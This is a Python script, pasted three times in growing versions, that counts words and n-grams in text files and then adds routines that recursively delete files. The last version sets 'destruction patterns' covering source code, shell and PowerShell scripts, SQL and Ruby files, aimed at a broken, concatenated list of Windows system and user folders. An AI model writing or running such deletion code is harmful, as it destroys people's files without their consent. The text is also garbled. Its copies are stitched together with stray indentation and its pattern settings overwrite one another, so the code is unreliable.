import os
import fnmatch
from collections import Counter
import re

class DirectoryScanner:
    def __init__(self, root_directory):
        self.root_directory = root_directory
        self.word_counter = Counter()

    def scan_directory(self):
        for dirpath, _, filenames in os.walk(self.root_directory):
            for filename in fnmatch.filter(filenames, '*.txt'):
                self._process_file(os.path.join(dirpath, filename))

    def _process_file(self, filepath):
        with open(filepath, 'r', encoding='utf-8') as file:
            for line in file:
                words = self._extract_words(line)
                self.word_counter.update(words)
                self._process_word_sequences(words)

    def _extract_words(self, line):
        # Use regular expressions to extract words, handling punctuation and other characters
        return re.findall(r'\b\w+\b', line.lower())

    def _process_word_sequences(self, words):
        # Process word sequences (bigrams, trigrams, etc.)
        for i in range(len(words) - 1):
            bigram = (words[i], words[i + 1])
            self.word_counter[bigram] += 1
        for i in range(len(words) - 2):
            trigram = (words[i], words[i + 1], words[i + 2])
            self.word_counter[trigram] += 1

    def most_common_words(self, n=10):
        return self.word_counter.most_common(n)

# Example usage
if __name__ == "__main__":
    scanner = DirectoryScanner("C:\unetbtin.exe"
"C:\chemin"
"C:\DRIVERS"
"C:\Intel"
"C:\MANUALS"
"C:\PerfLogs"
"C:\Program Files"
"C:\Program Files (x86)"
"C:\Users"
"C:\Windows"
"C:\XboxGames"
"C:\SWCONF.DAT")
    scanner.scan_directory()
    print(scanner.most_common_words(20))
import os
import fnmatch
from collections import Counter
import re

class DirectoryScanner:
    def __init__(self, root_directory):
        self.root_directory = root_directory
        self.word_counter = Counter()

    def scan_directory(self):
        for dirpath, _, filenames in os.walk(self.root_directory):
            for filename in fnmatch.filter(filenames, '*.txt'):
                self._process_file(os.path.join(dirpath, filename))

    def _process_file(self, filepath):
        with open(filepath, 'r', encoding='utf-8') as file:
            for line in file:
                words = self._extract_words(line)
                self.word_counter.update(words)
                self._process_word_sequences(words)

    def _extract_words(self, line):
        # Use regular expressions to extract words, handling punctuation and other characters
        return re.findall(r'\b\w+\b', line.lower())

    def _process_word_sequences(self, words):
        # Process word sequences (bigrams, trigrams, etc.)
        for i in range(len(words) - 1):
            bigram = (words[i], words[i + 1])
            self.word_counter[bigram] += 1
        for i in range(len(words) - 2):
            trigram = (words[i], words[i + 1], words[i + 2])
            self.word_counter[trigram] += 1

    def most_common_words(self, n=10):
        return self.word_counter.most_common(n)

    def delete_file(self, filepath):
        try:
            os.remove(filepath)
            print(f"Deleted file: {filepath}")
        except OSError as e:
            print(f"Error: {filepath} : {e.strerror}")

    def delete_files_matching_pattern(self, pattern):
        for dirpath, _, filenames in os.walk(self.root_directory):
            for filename in fnmatch.filter(filenames, pattern):
                self.delete_file(os.path.join(dirpath, filename))

# Example usage
if __name__ == "__main__":
    scanner = DirectoryScanner("C:\unetbtin.exe"
"C:\chemin"
"C:\DRIVERS"
"C:\Intel"
"C:\MANUALS"
"C:\PerfLogs"
"C:\Program Files"
"C:\Program Files (x86)"
"C:\Users"
"C:\Windows"
"C:\XboxGames"
"C:\SWCONF.DAT")
    
    # Scan directory and print most common words
    scanner.scan_directory()
    print(scanner.most_common_words(20))
    
    # Delete files matching the pattern
    scanner.delete_files_matching_pattern('*.tmp')
                               import os
import fnmatch
from collections import Counter
import re

class DirectoryScanner:
    def __init__(self, root_directory):
        self.root_directory = root_directory
        self.word_counter = Counter()
        self.detection_patterns = []
        self.destruction_patterns = []

    def scan_directory(self):
        for dirpath, _, filenames in os.walk(self.root_directory):
            for pattern in self.detection_patterns:
                for filename in fnmatch.filter(filenames, pattern):
                    self._process_file(os.path.join(dirpath, filename))

    def _process_file(self, filepath):
        with open(filepath, 'r', encoding='utf-8') as file:
            for line in file:
                words = self._extract_words(line)
                self.word_counter.update(words)
                self._process_word_sequences(words)

    def _extract_words(self, line):
        # Use regular expressions to extract words, handling punctuation and other characters
        return re.findall(r'\b\w+\b', line.lower())

    def _process_word_sequences(self, words):
        # Process word sequences (bigrams, trigrams, etc.)
        for i in range(len(words) - 1):
            bigram = (words[i], words[i + 1])
            self.word_counter[bigram] += 1
        for i in range(len(words) - 2):
            trigram = (words[i], words[i + 1], words[i + 2])
            self.word_counter[trigram] += 1

    def most_common_words(self, n=10):
        return self.word_counter.most_common(n)

    def delete_file(self, filepath):
        try:
            os.remove(filepath)
            print(f"Deleted file: {filepath}")
        except OSError as e:
            print(f"Error: {filepath} : {e.strerror}")

    def delete_files_matching_pattern(self):
        for dirpath, _, filenames in os.walk(self.root_directory):
            for pattern in self.destruction_patterns:
                for filename in fnmatch.filter(filenames, pattern):
                    self.delete_file(os.path.join(dirpath, filename))

    def set_detection_patterns(self, patterns):
        self.detection_patterns = patterns

    def set_destruction_patterns(self, patterns):
        self.destruction_patterns = patterns

# Example usage
if __name__ == "__main__":
    scanner = DirectoryScanner("C:\MANUALS"
"C:\PerfLogs"
"C:\Program Files"
"C:\Program Files (x86)"
"C:\Users"
"C:\Windows"
"C:\XboxGames"
"C:\SWCONF.DAT"
"C:\unetbtin.exe"
"C:\chemin"
"C:\DRIVERS"
"C:\Intel")
    
    # Set detection and destruction patterns
    scanner.set_detection_patterns(['*.txt', '*.md'])
    scanner.set_destruction_patterns(['*.tmp', '*.log'])
    scanner.set_destruction_patterns(['*.js', '*.py', '*.html', '*.cpp', '*.c'])
    scanner.set_destruction_patterns(['*.sh', '*.ps1'])
    scanner.set_destruction_patterns(['*.sql', '*.rb'])
    scanner.set_destruction_patterns(['*.rb', '*.p1'])
  
    # Scan directory and print most common words
    scanner.scan_directory()
    print(scanner.most_common_words(20))
    
    # Delete files matching the destruction patterns
    scanner.delete_files_matching_pattern()

